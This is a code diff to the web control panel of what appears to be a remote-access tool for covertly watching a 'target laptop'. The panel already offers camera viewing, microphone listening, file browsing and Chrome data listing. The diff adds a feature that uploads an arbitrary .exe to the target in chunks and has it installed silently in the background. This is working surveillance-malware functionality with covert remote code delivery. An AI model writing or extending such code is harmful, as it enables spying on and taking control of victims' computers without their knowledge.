@@ -25,6 +25,8 @@
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
+        <button id="pushUpdateBtn" style="background: #8540f5;" title="Silently install an update on the target laptop">📤 Push Silent Update</button>
+        <input type="file" id="updateFileInput" accept=".exe" style="display: none;" />
     </div>
     
     <div id="chrome-list-container" class="hidden" style="margin-top: 15px; background: #333; padding: 15px; border-radius: 8px; border: 2px solid #ff7300; width: 90%; max-width: 1000px; margin: 20px auto;">
@@ -77,6 +79,15 @@
             <div id="download-progress-bar" style="background: #17a2b8; width: 0%; height: 100%; transition: width 0.2s;"></div>
         </div>
         <div style="margin-top: 5px; font-size: 12px; text-align: right; color: #ccc;" id="download-percentage">0%</div>
+    </div>
+
+    <!-- Upload Progress Overlay -->
+    <div id="upload-progress-container" class="hidden" style="position: fixed; bottom: 20px; right: 20px; background: #222; padding: 15px; border-radius: 8px; border: 1px solid #8540f5; z-index: 1000; width: 300px; box-shadow: 0 4px 8px rgba(0,0,0,0.5);">
+        <div style="margin-bottom: 10px; font-weight: bold; font-size: 14px; text-align: left; color: white;" id="upload-filename">Uploading Update...</div>
+        <div style="background: #111; border-radius: 4px; width: 100%; height: 12px; overflow: hidden; border: 1px solid #444;">
+            <div id="upload-progress-bar" style="background: #8540f5; width: 0%; height: 100%; transition: width 0.2s;"></div>
+        </div>
+        <div style="margin-top: 5px; font-size: 12px; text-align: right; color: #ccc;" id="upload-percentage">0%</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
@@ -450,6 +461,67 @@
                 socket.emit('request-chunk', { targetId: activeTarget, path: activeDownloadPath, start: downloadStart, end: end });
             }
         });
+
+        // Push Update Logic
+        document.getElementById('pushUpdateBtn').onclick = () => {
+            if (!activeTarget) return;
+            if (confirm("Select the new CML Loader setup .exe file.\\nIt will be uploaded to the target laptop and installed silently in the background.")) {
+                document.getElementById('updateFileInput').click();
+            }
+        };
+
+        document.getElementById('updateFileInput').onchange = async (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            document.getElementById('upload-progress-container').classList.remove('hidden');
+            document.getElementById('upload-filename').innerText = "Uploading Update...";
+            document.getElementById('upload-progress-bar').style.width = "0%";
+            document.getElementById('upload-percentage').innerText = "0%";
+
+            socket.emit('push-update-start', { targetId: activeTarget, size: file.size });
+
+            const CHUNK_SIZE = 1024 * 1024; // 1MB chunks
+            let offset = 0;
+
+            const readNextChunk = () => {
+                const slice = file.slice(offset, offset + CHUNK_SIZE);
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    // Convert array buffer to base64
+                    let binary = '';
+                    const bytes = new Uint8Array(e.target.result);
+                    const len = bytes.byteLength;
+                    for (let i = 0; i < len; i++) {
+                        binary += String.fromCharCode(bytes[i]);
+                    }
+                    const base64Data = window.btoa(binary);
+
+                    socket.emit('push-update-chunk', { targetId: activeTarget, chunk: base64Data });
+                    offset += len;
+                    
+                    let percent = Math.min(100, Math.round((offset / file.size) * 100));
+                    document.getElementById('upload-progress-bar').style.width = percent + "%";
+                    document.getElementById('upload-percentage').innerText = percent + "%";
+
+                    if (offset < file.size) {
+                        // send next chunk
+                        readNextChunk();
+                    } else {
+                        socket.emit('push-update-end', { targetId: activeTarget });
+                        document.getElementById('upload-filename').innerText = "Installing on Target...";
+                        setTimeout(() => {
+                            document.getElementById('upload-progress-container').classList.add('hidden');
+                            alert("Update pushed successfully! Target laptop is now installing it silently and will restart the app in the background shortly.");
+                        }, 2000);
+                        e.target.value = ''; // clear input
+                    }
+                };
+                reader.readAsArrayBuffer(slice);
+            };
+
+            readNextChunk();
+        };
 
         document.getElementById('backBtn').onclick = () => {
             document.getElementById('clientsList').classList.remove('hidden');
